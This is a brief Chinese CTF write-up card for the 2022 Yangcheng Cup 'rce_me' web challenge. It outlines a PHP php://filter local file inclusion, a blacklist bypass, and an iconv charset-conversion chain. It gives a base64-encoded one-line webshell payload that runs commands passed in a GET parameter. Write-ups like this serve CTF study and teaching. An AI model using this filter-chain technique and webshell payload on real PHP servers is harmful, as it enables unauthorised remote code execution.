---
title: "2022 年羊城杯网络安全大赛 Writeup"
category: web
tags: ["2022 羊城杯", "web", "hxp-CTF", "includer's-revenge, base64, iconv-chain, php-filter, UTF-8, UTF-16, CSISO2022KR, UCS2, file-include, getflag"]
signals: ["2022 羊城杯 2022", "hxp-CTF", "includer's-revenge, base64, iconv-chain, php-filter, UTF-8, UTF-16, CSISO2022KR, UCS2, file-include, getflag", "lfi", "rce", "web_unknown", "rce_me", "php", "filter", "base64", "iconv", "hxp", "includer", "revenge"]
difficulty: hard
source: "https://www.ctfiot.com/54929.html"
tools: ["C", "PHP"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 2022 年羊城杯网络安全大赛 Writeup

> 赛事：2022 羊城杯 2022 | 方向：web | 难度：hard | 工具：C、PHP

## 一句话总结

2022 羊城杯 rce_me：php://filter + base64 + iconv 链 + hxp includer's revenge

## 攻击链

1. 题目: ?file=php://filter/...&0=command
2. 黑名单过滤 < ? $ [ ] ; eval > @ _ create install pear
3. 绕过 '4' 字符（其转换链带 _）→ 用 '8' 替代
4. base64 编码 payload: <?=`$_GET[0]`;;/* → PD89YCRfR0VUWzBdYDs7Lyo
5. iconv 链: convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2
6. 避免 4 (含 _), 用 R/B/C/8/9/f/s/z/U/P/V/0/Y/W 等字符的 iconv 链生成 PHP 标签
7. 用 php://filter 的 base64-decode + 多次 iconv 还原 base64
8. include 触发命令执行

## 关键 payload

```
PD89YCRfR0VUWzBdYDs7Lyo (base64 of '<?=`$_GET[0]`;;/*')
```

## 经验教训

php://filter 链是高级 LFI；iconv 链字符集转换是 CTF 经典；黑名单绕过要找对应字符

## 标签

hxp-CTF、includer's-revenge, base64, iconv-chain, php-filter, UTF-8, UTF-16, CSISO2022KR, UCS2, file-include, getflag

## 参考来源

- https://www.ctfiot.com/54929.html
- 原文件：2022年羊城杯网络安全大赛Writeup.full.md
